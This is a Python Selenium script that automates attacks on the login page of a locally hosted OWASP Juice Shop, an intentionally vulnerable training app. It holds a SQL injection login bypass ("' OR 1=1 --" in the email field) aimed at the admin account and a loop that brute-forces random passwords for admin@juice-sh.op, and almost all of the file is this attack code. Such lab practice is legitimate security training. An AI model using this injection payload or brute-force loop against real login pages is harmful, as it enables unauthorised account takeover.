from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
import argparse
import time
import random, string

letters = string.ascii_lowercase
num_options = "0123456789"
all_letters = string.ascii_letters.join(num_options)

def randomword():
    length = random.randint(3,7)
    nums = random.randint(0,4)
    out = ''.join(random.choice(letters) for i in range(length))
    out = out + ''.join(random.choice(num_options) for i in range(nums))
    return out

def randomhard():
    length = random.randint(1, 16)
    return ''.join(random.choice(all_letters) for i in range (length))

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-method', required=True) # valid types: sql, brute, dict
    parser.add_argument('-attempts', nargs='?', const=10000) # make depth attempts, only for admin_brute
    args = parser.parse_args()
    method = str(args.method)
    attempts = int(args.attempts)
    
    # Initialize the WebDriver
    driver = webdriver.Chrome()  # Use the browser of your choice (e.g., Firefox, Edge)

    # Open the webpage
    driver.get("http://localhost:3000/")

    # Wait for and dismiss the overlay
    try:
        dismissBtn = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.CLASS_NAME, "mat-focus-indicator.mat-raised-button.mat-warn"))
        )
        dismissBtn.click()
        print("Overlay dismissed.")
    except Exception as e:
        print(f"Could not dismiss the overlay: {e}")

    if(method == "sql"):
        logInAdminSql(driver)
    elif(method == "brute"):
        bruteForcePassword(driver, attempts, False)
    elif(method == "hardbrute"):
        bruteForcePassword(driver, attempts, True)
    elif(method == "dict"):
        print("dictionary attack is not available in your geographic region")
    else:
        print("Usage: adminLogin.py -method=[sql, brute]")
    # Close the browser
    input("Press Enter to close the browser...")
    driver.quit()
    exit()

def bruteForcePassword(driver, attempts, hardness):
        # Attempt to log in
    print("Strap in, this could take quite a while")
    try:

        acctBtn = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "navbarAccount"))
        )
        acctBtn.click()

        logInBtn = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.ID, "navbarLoginButton"))
        )
        logInBtn.click()
    except Exception as e:
        print(f"Could not click log in buttons: {e}")

    emailField = WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.ID, "email"))
    )
    emailField.send_keys("admin@juice-sh.op")
    # Open file and test each password
    #with open("genericPasswords.txt") as f:
    for n in range(1, attempts):
        if(hardness):
            password = randomhard()
        else:
            password = randomword()
        try:
            print(f"Trying password: {password}")
            passwordField = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.ID, "password"))
            )
            passwordField.clear()
            passwordField.send_keys(password)
            passwordField.send_keys(Keys.RETURN)
        except Exception as e:
            print(f"Could not enter text: {e}")
         # Check if the login was successful
        #try:
            #invalidDiv = WebDriverWait(driver, 10).until(
            #    EC.presence_of_element_located((By.CLASS_NAME, "error.ng-star-inserted"))
            #)
        #except Exception as e:
        #    print(f"Could not find invalid text: {e}")


def logInAdminSql(driver):
    

    # Attempt to log in
    try:

        acctBtn = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "navbarAccount"))
        )
        acctBtn.click()

        logInBtn = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.ID, "navbarLoginButton"))
        )
        logInBtn.click()

        emailField = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "email"))
        )
        emailField.send_keys("\' OR 1=1 --")
        passwordField = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "password"))
        )
        passwordField.send_keys("password")
        passwordField.send_keys(Keys.RETURN)
    except Exception as e:
        print(f"Could not enter text: {e}")

if __name__ == "__main__":
    main()



